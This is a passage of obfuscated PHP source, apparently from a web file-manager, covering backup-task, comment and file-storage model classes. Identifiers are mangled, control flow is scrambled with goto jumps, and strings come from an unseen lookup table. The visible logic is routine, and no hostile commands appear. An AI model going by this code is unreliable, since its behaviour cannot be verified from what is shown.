Model($BÍ¯­¸†©Ä[2120])->listData(); foreach ($e«ÆÆŒÀÖÔ as $E¬İ…»¾) { if ($E¬İ…»¾[$BÍ¯­¸†©Ä[1073]] == $BÍ¯­¸†©Ä[83] && $E¬İ…»¾[$BÍ¯­¸†©Ä[1417]] == $BÍ¯­¸†©Ä[2121]) { $Eº…äµÁ® = $E¬İ…»¾; break; } } goto d§Ãî‡¾º; d§Ãî‡¾º: if (isset($Eº…äµÁ®[$BÍ¯­¸†©Ä[190]])) { $Eº…äµÁ®[$BÍ¯­¸†©Ä[190]] = json_decode($Eº…äµÁ®[$BÍ¯­¸†©Ä[190]], !0); } if (isset($b›¡ùêß”×[$BÍ¯­¸†©Ä[190]])) { $Eº…äµÁ®[$BÍ¯­¸†©Ä[190]][$BÍ¯­¸†©Ä[1404]] = $b›¡ùêß”×[$BÍ¯­¸†©Ä[190]]; unset($b›¡ùêß”×[$BÍ¯­¸†©Ä[190]]); } return array_merge($Eº…äµÁ®, $b›¡ùêß”×); goto dÇÖÛÌàÏ‘; F“îÇËƒµÉ: $BÍ¯­¸†©Ä =& $_SERVER[Î¿—”òá]; $b›¡ùêß”× = Model($BÍ¯­¸†©Ä[1081])->get($BÍ¯­¸†©Ä[710]); $b›¡ùêß”× = json_decode($b›¡ùêß”×, !0); goto D¨¦ñ—Â–ë; D¨¦ñ—Â–ë: $b›¡ùêß”× = is_array($b›¡ùêß”×) ? $b›¡ùêß”× : array(); if (!isset($b›¡ùêß”×[$BÍ¯­¸†©Ä[688]])) { $b›¡ùêß”×[$BÍ¯­¸†©Ä[688]] = $BÍ¯­¸†©Ä[468]; } $Eº…äµÁ® = array(); goto C‘ªõğ¶é; dÇÖÛÌàÏ‘: } public function listData($A—ç¢×¤Ù = false, $cñÄª÷Ç“İ = "\155\157\x64\151\146\171\x54\151\155\x65", $c”õÚÍˆ = false) { return parent::listData($A—ç¢×¤Ù, $cñÄª÷Ç“İ, !0); } public function lastItem() { $b²È«³Ö = $this->listData(); return !empty($b²È«³Ö[0]) ? $b²È«³Ö[0] : null; } public function kill($FŠèİ§Óç) { goto bæ‹ò…¶ˆñ; bæ‹ò…¶ˆñ: $B„Â‘¥Ô›Š =& $_SERVER[Î¿—”òá]; $FÌ‚†ô„ùÄ = $this->listData($FŠèİ§Óç); if (!$FÌ‚†ô„ùÄ || empty($FÌ‚†ô„ùÄ[$B„Â‘¥Ô›Š[28]])) { return !0; } goto dÕòŒ·ñãß; dÕòŒ·ñãß: Task::kill($B„Â‘¥Ô›Š[709]); Task::kill($B„Â‘¥Ô›Š[725]); Task::kill($B„Â‘¥Ô›Š[733]); goto dé£ÎĞˆÕ; dé£ÎĞˆÕ: $aÊñë”¦¸ = $FÌ‚†ô„ùÄ[$B„Â‘¥Ô›Š[28]]; $eºêè©ÚŠÚ = TEMP_FILES . $B„Â‘¥Ô›Š[706] . $aÊñë”¦¸ . $B„Â‘¥Ô›Š[8]; IO::remove($eºêè©ÚŠÚ, !1); goto BÍÛ¤÷áã­; BÍÛ¤÷áã­: return $this->remove($FŠèİ§Óç); goto Eòâ”‚Ñ—Å; Eòâ”‚Ñ—Å: } public function remove($F³ ÜÀôĞ) { $B½©»šÁ·Ã = $this->listData($F³ ÜÀôĞ); if (!$B½©»šÁ·Ã) { return !0; } return $this->backupRemove($B½©»šÁ·Ã); } private function backupRemove($A¸Òì¥ÛŒÈ) { $Aå¾Ù„Ô— =& $_SERVER[Î¿—”òá]; parent::remove($A¸Òì¥ÛŒÈ[$Aå¾Ù„Ô—[367]]); $b†öøÕŒ¦Ô = "\x7b\x69\157\x3a{$A¸Òì¥ÛŒÈ[$Aå¾Ù„Ô—[687]]}\175\57\144\141\164\141\x62\141\163\x65\x2f\142\141\143\x6b\165\160\x5f" . $A¸Òì¥ÛŒÈ[$Aå¾Ù„Ô—[28]]; IO::remove($b†öøÕŒ¦Ô, !1); return !0; } public function start() { goto CÄˆ¨×–ï ; FšŞˆ„‹‡: if (!$A½Çöµâïç->dbFile()) { return !1; } if ($D¼æÔµ†ÅÈ[$E´©Èî…÷‡[688]] == $E´©Èî…÷‡[468]) { $A½Çöµâïç->file(); } Backup::set(array($E´©Èî…÷‡[685] => 1, $E´©Èî…÷‡[699] => time())); goto f…»êÒœ‡ğ; D¹¾Õª¡·: if (!$D¼æÔµ†ÅÈ || $D¼æÔµ†ÅÈ[$E´©Èî…÷‡[1401]] != $E´©Èî…÷‡[83]) { return !1; } $F½¶ˆ§¸ = $this->process(); foreach ($F½¶ˆ§¸ as $B¯å¨¼ï¥ô) { if ($B¯å¨¼ï¥ô) { return Task::restart($B¯å¨¼ï¥ô[$E´©Èî…÷‡[367]]); } } goto eª± õÛ’â; f…»êÒœ‡ğ: return !0; goto C›Ü¬Ø»; CÄˆ¨×–ï : $E´©Èî…÷‡ =& $_SERVER[Î¿—”òá]; if ($GLOBALS[$E´©Èî…÷‡[6]][$E´©Èî…÷‡[84]][$E´©Èî…÷‡[2122]] != $E´©Èî…÷‡[83]) { return !0; } $D¼æÔµ†ÅÈ = $this->config(); goto D¹¾Õª¡·; eª± õÛ’â: $A½Çöµâïç = new Backup(); $A½Çöµâïç->keep(); if (!$A½Çöµâïç->db()) { return !1; } goto FšŞˆ„‹‡; C›Ü¬Ø»: } public function process() { $dµğ´¤ÜÜ =& $_SERVER[Î¿—”òá]; return array($dµğ´¤ÜÜ[690] => Task::get($dµğ´¤ÜÜ[709]), $dµğ´¤ÜÜ[693] => Task::get($dµğ´¤ÜÜ[725]), $dµğ´¤ÜÜ[167] => Task::get($dµğ´¤ÜÜ[733])); } public function restore() { $D‘¯‰¦ƒ­õ =& $_SERVER[Î¿—”òá]; ActionCall($D‘¯‰¦ƒ­õ[2123], !0, 1); ActionCall($D‘¯‰¦ƒ­õ[2123], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\x6e\164"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\x6d\145" => "\143\x6f\155\155\x65\x6e\x74\x5f\155\145\164\x61", "\155\145\164\141\x46\151\x65\154\x64" => "\143\x6f\x6d\155\145\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($aßœ¸¥ïô²) { $f¦ŸÜ×Ò— =& $_SERVER[Î¿—”òá]; if ($aßœ¸¥ïô²[$f¦ŸÜ×Ò—[2124]]) { $D½µ óˆ± = $this->where(array($f¦ŸÜ×Ò—[2125] => $aßœ¸¥ïô²[$f¦ŸÜ×Ò—[2124]]))->find(); if (!$D½µ óˆ± || $D½µ óˆ±[$f¦ŸÜ×Ò—[371]] != $aßœ¸¥ïô²[$f¦ŸÜ×Ò—[371]] || $D½µ óˆ±[$f¦ŸÜ×Ò—[456]] != $aßœ¸¥ïô²[$f¦ŸÜ×Ò—[456]]) { return !1; } $this->where(array($f¦ŸÜ×Ò—[2125] => $aßœ¸¥ïô²[$f¦ŸÜ×Ò—[2124]]))->setAdd($f¦ŸÜ×Ò—[2126], 1); } return $this->add($aßœ¸¥ïô²); } public function remove($fº»‘“ø±¿) { $C”âË°¤…¬ =& $_SERVER[Î¿—”òá]; $C‡÷ŒèàÀ» = array($C”âË°¤…¬[2125] => $fº»‘“ø±¿); $dŠá×à¤Å¤ = $this->where($C‡÷ŒèàÀ»)->find(); if ($dŠá×à¤Å¤[$C”âË°¤…¬[2124]]) { $this->where(array($C”âË°¤…¬[2125] => $dŠá×à¤Å¤[$C”âË°¤…¬[2124]]))->setAdd($C”âË°¤…¬[2126], -1); } return $this->where($C‡÷ŒèàÀ»)->delete(); } public function edit($c©ì·ò±¯ø, $DÍÚ–¼È) { $D ªò˜‡ì =& $_SERVER[Î¿—”òá]; $dÇí¬•ƒš = array($D ªò˜‡ì[2125] => $c©ì·ò±¯ø); return $this->where($dÇí¬•ƒš)->save(array($D ªò˜‡ì[2127] => $DÍÚ–¼È)); } public function prasise($eâ‚ÁÙÉ•) { $a„Äˆ·½ò© =& $_SERVER[Î¿—”òá]; $BÔÓÓ¢‘—Ä = Model($a„Äˆ·½ò©[2128]); $d¡Ô´ÀŠ¼ = array($a„Äˆ·½ò©[2125] => $eâ‚ÁÙÉ•, $a„Äˆ·½ò©[1420] => USER_ID); $Eïò…Œ…ğÃ = $BÔÓÓ¢‘—Ä->where($d¡Ô´ÀŠ¼)->find(); if (!$Eïò…Œ…ğÃ) { $BÔÓÓ¢‘—Ä->add($d¡Ô´ÀŠ¼); $DøšÃ’Æ–Ğ = $this->where(array($a„Äˆ·½ò©[2125] => $eâ‚ÁÙÉ•))->setAdd($a„Äˆ·½ò©[2129], 1); } else { $BÔÓÓ¢‘—Ä->where($d¡Ô´ÀŠ¼)->delete(); $DøšÃ’Æ–Ğ = $this->where(array($a„Äˆ·½ò©[2125] => $eâ‚ÁÙÉ•))->setAdd($a„Äˆ·½ò©[2129], -1); } return $DøšÃ’Æ–Ğ; } public function targetInfo($Cé»É¨âšˆ, $d³ì±ºïâç) { goto aîõíö¦ÅÁ; aîõíö¦ÅÁ: $A¾¢¼õª¯ò =& $_SERVER[Î¿—”òá]; $B…à¦Šç… = array($A¾¢¼õª¯ò[521] => $Cé»É¨âšˆ, $A¾¢¼õª¯ò[522] => $d³ì±ºïâç); $b±ğÊŠ‡ = $this->where($B…à¦Šç…)->count(); goto Bö®—ˆã™£; b—ÁˆÚ¨§–: return $e¡„³ˆá¡; goto aßäá¹²¢ê; Bö®—ˆã™£: $AÄÂİÖÓ° = "\x52\x49\107\110\x54\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\143\157\155\155\145\x6e\164\x5f\x70\x72\x61\151\x73\145\x20\163\164\141\x72\x20\x6f\156\40\143\x6f\x6d\x6d\145\x6e\164\x2e\x63\x6f\155\155\145\x6e\x74\111\104\40\x3d\x20\x73\x74\x61\162\x2e\x63\157\x6d\x6d\x65\x6e\164\x49\104"; $c‰Æ°‹ = $this->alias($A¾¢¼õª¯ò[341])->where($B…à¦Šç…)->join($AÄÂİÖÓ°, $A¾¢¼õª¯ò[2130])->count(); $e¡„³ˆá¡ = array($A¾¢¼õª¯ò[2131] => $b±ğÊŠ‡, $A¾¢¼õª¯ò[2132] => $c‰Æ°‹); goto b—ÁˆÚ¨§–; aßäá¹²¢ê: } public function listData($A©ÈµÁÛ’) { $F’ö—¤²¸ =& $_SERVER[Î¿—”òá]; if (isset($A©ÈµÁÛ’[$F’ö—¤²¸[2133]])) { if ($A©ÈµÁÛ’[$F’ö—¤²¸[2133]]) { $A©ÈµÁÛ’[$F’ö—¤²¸[2134]] = array($F’ö—¤²¸[921], intval($A©ÈµÁÛ’[$F’ö—¤²¸[2133]])); } unset($A©ÈµÁÛ’[$F’ö—¤²¸[2133]]); } if (isset($A©ÈµÁÛ’[$F’ö—¤²¸[2135]])) { if ($A©ÈµÁÛ’[$F’ö—¤²¸[2135]]) { $A©ÈµÁÛ’[$F’ö—¤²¸[2134]] = array($F’ö—¤²¸[918], intval($A©ÈµÁÛ’[$F’ö—¤²¸[2135]])); } unset($A©ÈµÁÛ’[$F’ö—¤²¸[2135]]); } return $this->_listData($A©ÈµÁÛ’); } private function _listData($eÉÈ´„ïå) { $EÏÜÄ™¨áƒ =& $_SERVER[Î¿—”òá]; $d½º™Ë‘› = $this->where($eÉÈ´„ïå)->_makeOrder()->selectPage(100); $this->_listAppendParent($d½º™Ë‘›[$EÏÜÄ™¨áƒ[354]]); $this->_listAppendUser($d½º™Ë‘›[$EÏÜÄ™¨áƒ[354]]); $this->_listAppendMeta($d½º™Ë‘›[$EÏÜÄ™¨áƒ[354]]); return $d½º™Ë‘›; } private function _makeOrder() { $CÓ¼×Äí–ù =& $_SERVER[Î¿—”òá]; $ašÆ‘Ş‰÷ = array($CÓ¼×Äí–ù[2129], $CÓ¼×Äí–ù[2126], $CÓ¼×Äí–ù[187]); $dÓ—–Ò©†Õ = Input::get($CÓ¼×Äí–ù[407], $CÓ¼×Äí–ù[7], $CÓ¼×Äí–ù[389], $ašÆ‘Ş‰÷); $aù¯›É¶Ø = Input::get($CÓ¼×Äí–ù[408], $CÓ¼×Äí–ù[7], $CÓ¼×Äí–ù[1422], array($CÓ¼×Äí–ù[2136], $CÓ¼×Äí–ù[405])); $bÜÉÕ¥„“¸ = $dÓ—–Ò©†Õ . $CÓ¼×Äí–ù[50] . $aù¯›É¶Ø; return $this->order($bÜÉÕ¥„“¸); } private function _listAppendParent(&$a”ÓÁËÃÓ²) { goto aêÖó¼ñ‘; aêÖó¼ñ‘: $CƒæšÏÉÆŸ =& $_SERVER[Î¿—”òá]; $Fµ¼œöõ¼› = array_unique(array_to_keyvalue($a”ÓÁËÃÓ², $CƒæšÏÉÆŸ[33], $CƒæšÏÉÆŸ[2124])); $Fµ¼œöõ¼› = array_remove_value($Fµ¼œöõ¼›, $CƒæšÏÉÆŸ[468]); goto cËÑå¹Ö•Ş; a»¦„®„Æô: foreach ($a”ÓÁËÃÓ² as &$Fİùê¼ÇÙñ) { if (isset($D¢ÙĞ¹ğ—¯[$Fİùê¼ÇÙñ[$CƒæšÏÉÆŸ[2124]]])) { $Fİùê¼ÇÙñ[$CƒæšÏÉÆŸ[2137]] = $D¢ÙĞ¹ğ—¯[$Fİùê¼ÇÙñ[$CƒæšÏÉÆŸ[2124]]]; } } goto AÄÆ‹…÷Ø‹; cËÑå¹Ö•Ş: if (!$Fµ¼œöõ¼›) { return; } $D¢ÙĞ¹ğ—¯ = $this->where(array($CƒæšÏÉÆŸ[2125] => array($CƒæšÏÉÆŸ[7], $Fµ¼œöõ¼›)))->select(); $D¢ÙĞ¹ğ—¯ = array_to_keyvalue($D¢ÙĞ¹ğ—¯, $CƒæšÏÉÆŸ[2134]); goto a»¦„®„Æô; AÄÆ‹…÷Ø‹: } private function _listAppendUser(&$eŸì—…íÄ) { goto dˆÄÂ¸Ú‰‰; dÒ‡£»Áš…: foreach ($eŸì—…íÄ as &$C†èâôÀ…­) { $C†èâôÀ…­[$AÀ…íŞ‘ŒÌ[535]] = $cÀ®÷ÒÑÇ†[$C†èâôÀ…­[$AÀ…íŞ‘ŒÌ[1429]]]; if (isset($C†èâôÀ…­[$AÀ…íŞ‘ŒÌ[2137]])) { $C†èâôÀ…­[$AÀ…íŞ‘ŒÌ[2137]][$AÀ…íŞ‘ŒÌ[535]] = $cÀ®÷ÒÑÇ†[$C†èâôÀ…­[$AÀ…íŞ‘ŒÌ[2137]][$AÀ…íŞ‘ŒÌ[1429]]]; } } goto Aß¿ïÚÀ¸Ø; dˆÄÂ¸Ú‰‰: $AÀ…íŞ‘ŒÌ =& $_SERVER[Î¿—”òá]; $f½²ˆ‚‚®¬ = array_unique(array_to_keyvalue($eŸì—…íÄ, $AÀ…íŞ‘ŒÌ[33], $AÀ…íŞ‘ŒÌ[1429])); $f½²ˆ‚‚®¬ = array_remove_value($f½²ˆ‚‚®¬, $AÀ…íŞ‘ŒÌ[468]); goto AˆÄÁïè‚î; AˆÄÁïè‚î: if (count($f½²ˆ‚‚®¬) == 0) { return; } foreach ($eŸì—…íÄ as $C†èâôÀ…­) { if (isset($C†èâôÀ…­[$AÀ…íŞ‘ŒÌ[2137]])) { $f½²ˆ‚‚®¬[] = $C†èâôÀ…­[$AÀ…íŞ‘ŒÌ[2137]][$AÀ…íŞ‘ŒÌ[1429]]; } } $cÀ®÷ÒÑÇ† = Model($AÀ…íŞ‘ŒÌ[477])->userListInfo($f½²ˆ‚‚®¬); goto dÒ‡£»Áš…; Aß¿ïÚÀ¸Ø: } private function _listAppendMeta(&$AÍÒªâŠğÌ) { goto dÎÔéã—; dÎÔéã—: $fÜÜÑ¯ŠÉ =& $_SERVER[Î¿—”òá]; $fŠˆÔ®Ë‘Ç = array_unique(array_to_keyvalue($AÍÒªâŠğÌ, $fÜÜÑ¯ŠÉ[33], $fÜÜÑ¯ŠÉ[2134])); $fŠˆÔ®Ë‘Ç = array_remove_value($fŠˆÔ®Ë‘Ç, $fÜÜÑ¯ŠÉ[468]); goto e¹ÒÑˆµÕ; e¹ÒÑˆµÕ: if (!$fŠˆÔ®Ë‘Ç) { return; } foreach ($AÍÒªâŠğÌ as $d˜Á°›‚ßì) { if (isset($d˜Á°›‚ßì[$fÜÜÑ¯ŠÉ[2137]])) { $fŠˆÔ®Ë‘Ç[] = $d˜Á°›‚ßì[$fÜÜÑ¯ŠÉ[2137]][$fÜÜÑ¯ŠÉ[2134]]; } } $d á…ŠÇ‘Â = $this->metaList($fŠˆÔ®Ë‘Ç); goto D£³ÎÉóÄ¨; D£³ÎÉóÄ¨: if (!$d á…ŠÇ‘Â) { return !1; } foreach ($AÍÒªâŠğÌ as &$d˜Á°›‚ßì) { $d˜Á°›‚ßì[$fÜÜÑ¯ŠÉ[417]] = $d á…ŠÇ‘Â[$d˜Á°›‚ßì[$fÜÜÑ¯ŠÉ[2134]]]; if (isset($d˜Á°›‚ßì[$fÜÜÑ¯ŠÉ[2137]])) { $d˜Á°›‚ßì[$fÜÜÑ¯ŠÉ[2137]][$fÜÜÑ¯ŠÉ[417]] = $d á…ŠÇ‘Â[$d˜Á°›‚ßì[$fÜÜÑ¯ŠÉ[2137]][$fÜÜÑ¯ŠÉ[2134]]]; } } goto fÁƒóÔÈ; fÁƒóÔÈ: } private function metaList($fÎ°²š½ä) { goto cïµÜßñÛò; BëŠ¥ß‹Â: return $DâÒî™–™Õ ? $DâÒî™–™Õ : array(); goto Ağ‘±ç†è¢; aÓğ›¼·°: $DâÒî™–™Õ = Model($C·ÆÌ¬§èù[2138])->where($dÏÁÄ¯ŸÜŞ)->select(); $DâÒî™–™Õ = array_to_keyvalue_group($DâÒî™–™Õ, $C·ÆÌ¬§èù[2134]); foreach ($DâÒî™–™Õ as $F’˜Ô¹ö => $c±Æ •ùŞÌ) { $F½ö½İóĞŒ = array(); foreach ($c±Æ •ùŞÌ as $BºØå­“í®) { $F½ö½İóĞŒ[$BºØå­“í®[$C·ÆÌ¬§èù[89]]] = $BºØå­“í®[$C·ÆÌ¬§èù[359]]; } $DâÒî™–™Õ[$F’˜Ô¹ö] = $F½ö½İóĞŒ; } goto BëŠ¥ß‹Â; cïµÜßñÛò: $C·ÆÌ¬§èù =& $_SERVER[Î¿—”òá]; if (!$fÎ°²š½ä) { return array(); } $dÏÁÄ¯ŸÜŞ = array($C·ÆÌ¬§èù[2134] => array($C·ÆÌ¬§èù[7], $fÎ°²š½ä)); goto aÓğ›¼·°; Ağ‘±ç†è¢: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\x6c\x65"; protected $tableMeta = array("\164\141\142\154\145\116\x61\155\x65" => "\151\157\137\x66\151\154\x65\x5f\155\145\x74\141", "\155\x65\x74\141\106\151\x65\154\144" => "\x66\151\154\145\x49\104"); public function fileInfo($f‰Ô‹­ˆÀ») { $bÉçÔáˆ¨ï =& $_SERVER[Î¿—”òá]; static $C«˜ºÃ¯à = array(); if (!isset($C«˜ºÃ¯à[$f‰Ô‹­ˆÀ»])) { $A¶ŸÚ›“¨¡ = $bÉçÔáˆ¨ï[2139]; $c†Êö¼ïçµ = Model($bÉçÔáˆ¨ï[422])->field($A¶ŸÚ›“¨¡)->where(array($bÉçÔáˆ¨ï[420] => $f‰Ô‹­ˆÀ»))->find(); $C«˜ºÃ¯à[$f‰Ô‹­ˆÀ»] = $c†Êö¼ïçµ; } return $C«˜ºÃ¯à[$f‰Ô‹­ˆÀ»]; } public function addFileByContent($F¡ÌÔÊøİ = '', $f‘Õ‚œŒï = '') { goto F‹Î¹ßÍ¡; D’ì Øïæğ: if (file_exists($a‡Á¿‡£½—)) { @unlink($a‡Á¿‡£½—); } return $E†™Ôô½ÛŒ; goto e÷º…æ‰æ÷; a‘Œ¶ÕØÉ: $a‡Á¿‡£½— = $f—Í±ßã§— . $F•±×¯¸”[2141] . rand_string(16); file_put_contents($a‡Á¿‡£½—, $F¡ÌÔÊøİ); $E†™Ôô½ÛŒ = $this->addFile($a‡Á¿‡£½—, $f‘Õ‚œŒï, !0); goto D’ì Øïæğ; F‹Î¹ßÍ¡: $F•±×¯¸” =& $_SERVER[Î¿—”òá]; $f—Í±ßã§— = TEMP_PATH . $F•±×¯¸”[2140]; if (!is_dir($f—Í±ßã§—)) { mk_dir($f—Í±ßã§—); } goto a‘Œ¶ÕØÉ; e÷º…æ‰æ÷: } public function createFileName($báßìŒ¥¾Ô) { goto fâÒÒŸŸŸï; BÆˆ­ÂêŞ˜: $a¬ÃÑŒ¸· = $B½”èØ³†ƒ->pathFather($DÙ¨šï²¬à); static $b¡¬„¶ô¥ = false; $dèä‹¿ò¡‹ = $D°ÆŠäÂÜÒ[2142] . md5($a¬ÃÑŒ¸·); goto eØòòÃÙÑ’; eØòòÃÙÑ’: if (!$b¡¬„¶ô¥ && !Cache::get($dèä‹¿ò¡‹)) { $b¡¬„¶ô¥ = !0; $CŒóåµîÉƒ = IO::mkdir($a¬ÃÑŒ¸·); if (!IO::exist($CŒóåµîÉƒ . $D°ÆŠäÂÜÒ[2143])) { IO::mkfile($CŒóåµîÉƒ . $D°ÆŠäÂÜÒ[2143]); } Cache::set($dèä‹¿ò¡‹, 1, 3600 * 2); } return $DÙ¨šï²¬à; goto Bæç‰µÁê‹; fâÒÒŸŸŸï: $D°ÆŠäÂÜÒ =& $_SERVER[Î¿—”òá]; $B½”èØ³†ƒ = IO::init($D°ÆŠäÂÜÒ[8]); $DÙ¨šï²¬à = $this->makeFilePath($báßìŒ¥¾Ô, $B½”èØ³†ƒ); goto BÆˆ­ÂêŞ˜; Bæç‰µÁê‹: } public function makeFilePath($b×‡ÍºÆê, $e„çµÅ«Ï·) { goto B£İœ¼ù¤Ú; B£İœ¼ù¤Ú: $dÎ—¸öä†ï =& $_SERVER[Î¿—”òá]; $d ˆ¼Ñ«ŒÃ = Model($dÎ—¸öä†ï[1081])->get($dÎ—¸öä†ï[2144]); $e¨«òË å = KodIO::defaultIO() . date($dÎ—¸öä†ï[2145]); goto BÆº¬‰ˆÑÔ; BÆº¬‰ˆÑÔ: $F“ğ Æó‹ = $e¨«òË å . rand_string(5) . short_id(100); $b×‡ÍºÆê = str_replace($dÎ—¸öä†ï[8], $dÎ—¸öä†ï[70], KodIO::clear($b×‡ÍºÆê)); if (!$b×‡ÍºÆê) { $d ˆ¼Ñ«ŒÃ = $dÎ—¸öä†ï[2146]; } goto E—ïˆË‡È©; E—ïˆË‡È©: switch ($d ˆ¼Ñ«ŒÃ) { case $dÎ—¸öä†ï[2147]: $F“ğ Æó‹ = $F“ğ Æó‹ . $dÎ—¸öä†ï[91] . $e„çµÅ«Ï·->ext($b×‡ÍºÆê); if ($e„çµÅ«Ï·->ext($b×‡ÍºÆê) == $dÎ—¸öä†ï[2087]) { $F“ğ Æó‹ .= $dÎ—¸öä†ï[2148]; } break; case $dÎ—¸öä†ï[2149]: goto F‡¼‰èË¡; F‡¼‰èË¡: $AóçšÛ—ùÁ = Model($dÎ—¸öä†ï[1081])->get($dÎ—¸öä†ï[1328]); $c®å—ÂÁÂ» = substr(md5($dÎ—¸öä†ï[1906] . $AóçšÛ—ùÁ . date($dÎ—¸öä†ï[683])), 0, 8); $e¨«òË å = KodIO::defaultIO() . date($dÎ—¸öä†ï[2150]) . $c®å—ÂÁÂ» . $dÎ—¸öä†ï[8]; goto eÀÓßˆËŞÚ; eÀÓßˆËŞÚ: if ($e„çµÅ«Ï·->ext($b×‡ÍºÆê) == $dÎ—¸öä†ï[2087]) { $b×‡ÍºÆê .= $dÎ—¸öä†ï[2148]; } $d‘‡ê†á = IO::fileNameAuto($e¨«òË å, $b×‡ÍºÆê); $F“ğ Æó‹ = $e¨«òË å . $d‘‡ê†á; goto e Å¢¼Ó½‡; e Å¢¼Ó½‡: break; goto E˜’ÛõÇš; E˜’ÛõÇš: case $dÎ—¸öä†ï[2146]: break; default: break; } return $F“ğ Æó‹; goto cÊ­–ö¯á²; cÊ­–ö¯á²: } public function addFileByRemote($D•õ¯™¤™Ù, $cÒÙ±ó¸øÙ, $Dº‡ï”Œİ˜ = array()) { goto eÓ«’ºƒ¯ğ; A‹ã›ò˜: if ($cÂ¤—¿´œ‘ = $this->addFileCheckExist($C¼Ò««¾•ğ[$E†Ì£÷•Íâ[164]], $C¼Ò««¾•ğ[$E†Ì£÷•Íâ[163]], $C¼Ò««¾•ğ[$E†Ì£÷•Íâ[77]])) { return $cÂ¤—¿´œ‘; } return $this->addFileData($C¼Ò««¾•ğ); goto aá¾ğÒ‚ŸÒ; eª”·•Ò¸ñ: $e×»“å–¿É = IO::hashMd5($D•õ¯™¤™Ù, $AÓˆì§½Ä‘); $cÄİÉÁ—ô = KodIO::defaultDriver(); $C¼Ò««¾•ğ = array($E†Ì£÷•Íâ[520] => IO::size($D•õ¯™¤™Ù), $E†Ì£÷•Íâ[2151] => 1, $E†Ì£÷•Íâ[386] => $cÒÙ±ó¸øÙ, $E†Ì£÷•Íâ[732] => $cÄİÉÁ—ô[$E†Ì£÷•Íâ[367]], $E†Ì£÷•Íâ[387] => $D•õ¯™¤™Ù, $E†Ì£÷•Íâ[2152] => $Dº‡ï”Œİ˜[$E†Ì£÷•Íâ[164]] ? $Dº‡ï”Œİ˜[$E†Ì£÷•Íâ[164]] : IO::hashSimple($D•õ¯™¤™Ù), $E†Ì£÷•Íâ[2153] => $e×»“å–¿É ? $e×»“å–¿É : $AÓˆì§½Ä‘); goto A‹ã›ò˜; eÓ«’ºƒ¯ğ: $E†Ì£÷•Íâ =& $_SERVER[Î¿—”òá]; if (!IO::exist($D•õ¯™¤™Ù)) { return !1; } $AÓˆì§½Ä‘ = $Dº‡ï”Œİ˜[$E†Ì£÷•Íâ[163]] ? $Dº‡ï”Œİ˜[$E†Ì£÷•Íâ[163]] : $E†Ì£÷•Íâ[33]; goto eª”·•Ò¸ñ; aá¾ğÒ‚ŸÒ: } private function addFileData($fªÉ¯¦³¼ó) { $D²ÍãÜùÕŠ =& $_SERVER[Î¿—”òá]; if (!$fªÉ¯¦³¼ó) { return !1; } $fªÉ¯¦³¼ó[$D²ÍãÜùÕŠ[77]] = intval($fªÉ¯¦³¼ó[$D²ÍãÜùÕŠ[77]]); if (!$fªÉ¯¦³¼ó[$D²ÍãÜùÕŠ[77]] && strlen($fªÉ¯¦³¼ó[$D²ÍãÜùÕŠ[164]]) > 32) { $fªÉ¯¦³¼ó[$D²ÍãÜùÕŠ[77]] = intval(substr($fªÉ¯¦³¼ó[$D²ÍãÜùÕŠ[164]], 32)); } $EçˆêìöØ¸ = $this->add($fªÉ¯¦³¼ó); return $this->find($EçˆêìöØ¸); } public function addFile($c½–ìõä´‚, $eÊ¶–çÒòº, $bÆ÷–ÍĞØ‹ = false) { $B¤‡ø×¾Å = IO::hashSimple($c½–ìõä´‚); $Dèí±×ãÎ« = IO::hashMd5($c½–ìõä´‚); $EóéÉã“Ü‚ = IO::size($c½–ìõä´‚); if ($D‘ªÁã‚¡ = $this->addFileCheckExist($B¤‡ø×¾Å, $Dèí±×ãÎ«, $EóéÉã“Ü‚)) { return $D‘ªÁã‚¡; } $Cå½ÄÆíÛÅ = $this->addFileMake($c½–ìõä´‚, $EóéÉã“Ü‚, $B¤‡ø×¾Å, $Dèí±×ãÎ«, $eÊ¶–çÒòº, $bÆ÷–ÍĞØ‹); return $this->addFileData($Cå½ÄÆíÛÅ); } public function addFileMake($E×ˆ¤öø™ê, $C­¾×ÙÈòÒ, $C—…Ô…Ã§, $eŒôÄË‚Œù, $bİíˆ—˜Î¡, $dÛ¸çÍ¡Ø) { goto f·‡Üƒõ¡†; f·‡Üƒõ¡†: $bò»’‰îÆÚ =& $_SERVER[Î¿—”òá]; $Bë×´ÚÂÑÕ = $this->createFileName($bİíˆ—˜Î¡); $eå¬•ÒÙĞ = get_path_father($Bë×´ÚÂÑÕ); goto A‹¶á¨‡Âá; F–…ºè †: $eµ¸Š±œ—ë = KodIO::defaultDriver(); $EÙÑå¡è‰ = array($bò»’‰îÆÚ[520] => $C­¾×ÙÈòÒ, $bò»’‰îÆÚ[2151] => 1, $bò»’‰îÆÚ[386] => $bİíˆ—˜Î¡, $bò»’‰îÆÚ[732] => $eµ¸Š±œ—ë[$bò»’‰îÆÚ[367]], $bò»’‰îÆÚ[387] => $Bë×´ÚÂÑÕ, $bò»’‰îÆÚ[2152] => $C—…Ô…Ã§, $bò»’‰îÆÚ[2153] => $eŒôÄË‚Œù); return $EÙÑå¡è‰; goto EƒçùÉ—; A‹¶á¨‡Âá: $D‹Ö¡çÏ¬Ã = get_path_this($Bë×´ÚÂÑÕ); if ($dÛ¸çÍ¡Ø) { $aîî‹—äí‰ = IO::move($E×ˆ¤öø™ê, $eå¬•ÒÙĞ, !1, $D‹Ö¡çÏ¬Ã); } else { $aîî‹—äí‰ = IO::copy($E×ˆ¤öø™ê, $eå¬•ÒÙĞ, !1, $D‹Ö¡çÏ¬Ã); } if (!$aîî‹—äí‰) { return !1; } goto F–…ºè †; EƒçùÉ—: } public function addFileCheckExist($E²Ú‰¼Şƒß, $C»µ‹ƒø‚ì, $d†éõš›ÜØ) { $f—Õ»Ã°å¾ =& $_SERVER[Î¿—”òá]; $aÑñ­Îñù› = $this->findByHash($E²Ú‰¼Şƒß, $C»µ‹ƒø‚ì); if (!$aÑñ­Îñù›) { return !1; } $AÜ±Ğ›¯ªØ = array($f—Õ»Ã°å¾[2151] => intval($aÑñ­Îñù›[$f—Õ»Ã°å¾[2154]]) + 1, $f—Õ»Ã°å¾[520] => 